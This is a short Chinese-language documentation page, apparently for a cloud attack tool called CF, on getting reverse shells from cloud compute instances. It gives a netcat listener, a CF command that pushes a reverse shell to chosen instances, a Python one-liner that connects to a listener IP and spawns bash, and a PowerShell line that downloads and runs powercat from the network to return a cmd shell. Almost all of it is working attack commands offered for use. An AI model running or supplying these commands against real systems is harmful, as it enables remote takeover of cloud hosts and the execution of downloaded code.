---
title: 反弹 Shell
---

## 反弹 Shell

首先在自己的主机上开启监听

```bash
nc -lvvp 4444
```

接着在 CF 中执行反弹 Shell 命令

`--lhost` 参数配置为自己监听主机的 IP，`--lport` 参数配置为自己的监听端口，`-i` 设置要反弹 Shell 的实例 ID（如果不指定则默认是全部实例）

```bash
cf ecs exec --lhost 123.123.123.123 --lport 4444 -i i-abcdefghijklmn
```

在 CF 中使用的 Linux 反弹 Shell 如下

```bash
export RHOST="123.123.123.123";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
```

   <img width="800" src="/img/1656605535.png">

   <img width="650" src="/img/1656605596.png">

在 CF 中使用的 Windows 反弹 Shell 如下

```bash
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 4444 -e cmd
```

   <img width="850" src="/img/1656605944.png">

   <img width="650" src="/img/1656605897.png">

> 由于 CF 等待命令执行结果的默认时间是 60 秒，所以在超过 60 秒后，CF 会提示命令执行超时，从而退出程序。
>
> 因为反弹 Shell 需要命令保持一直处于执行状态，所以在上面的图片里可以看到提示命令执行超时。

<Vssue />

<script>
export default {
    mounted () {
      this.$page.lastUpdated = "2022年6月30日"
    }
  }
</script>